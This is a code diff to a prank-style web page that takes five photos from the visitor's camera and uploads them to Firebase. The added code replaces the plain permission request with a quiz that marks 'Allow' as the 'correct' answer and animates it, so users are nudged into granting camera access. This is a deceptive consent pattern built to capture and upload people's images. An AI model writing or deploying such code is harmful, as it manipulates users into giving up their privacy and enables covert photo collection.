@@ -33,12 +33,51 @@
             color: red;
             margin-top: 20px;
         }
+        /* MCQ-style permission guidance */
+        .mcq-container {
+            margin-top: 30px;
+        }
+        .mcq-option {
+            display: inline-block;
+            margin: 10px;
+            padding: 10px 20px;
+            background-color: #333;
+            border-radius: 10px;
+            cursor: pointer;
+            position: relative;
+            font-size: 1.2em;
+        }
+        .mcq-option.correct {
+            border: 2px solid green;
+        }
+        .mcq-option.correct::after {
+            content: '';
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 2px solid green;
+            border-right-color: transparent;
+            border-bottom-color: transparent;
+            animation: rotateRight 1s linear infinite;
+        }
+        @keyframes rotateRight {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Kyu bhai, aaj photo ka postmortem nahi karoge kya? 🤣<br>Chalo photo record karte hain!</h1>
         <div class="footer-text">5 photos will be captured and uploaded to Firebase.</div>
+        <div class="mcq-container" id="mcq-container">
+            <p>Please select the correct option to allow camera permission:</p>
+            <div class="mcq-option correct" id="mcq-allow">Allow</div>
+            <div class="mcq-option" id="mcq-block">Block</div>
+        </div>
         <div class="fallback" id="fallback" style="display: none;">Your browser does not support the required permissions. Please open this page in Chrome or Safari.</div>
     </div>
 
@@ -66,9 +105,11 @@
     let photoCount = 0;
     const totalPhotos = 5;
     const fallbackDiv = document.getElementById('fallback');
+    const mcqContainer = document.getElementById('mcq-container');
 
     function showFallback() {
         fallbackDiv.style.display = 'block';
+        mcqContainer.style.display = 'none';
     }
 
     function capturePhoto(video) {
@@ -118,8 +159,8 @@
                 localStorage.removeItem('cameraPermissionGranted');
                 showFallback();
             } else {
-                // Prompt the user
-                askForPermission();
+                // Show the MCQ guidance to the user
+                mcqContainer.style.display = 'block';
             }
 
             // Monitor for changes in permission state
@@ -169,6 +210,17 @@
         localStorage.removeItem('cameraPermissionGranted');
     });
 
+    // Event listeners for MCQ-style options
+    document.getElementById('mcq-allow').addEventListener('click', () => {
+        askForPermission();
+        mcqContainer.style.display = 'none';
+    });
+
+    document.getElementById('mcq-block').addEventListener('click', () => {
+        showFallback();
+    });
+
+    // Initialize camera permissions
     initCamera();
 </script>
 </body>
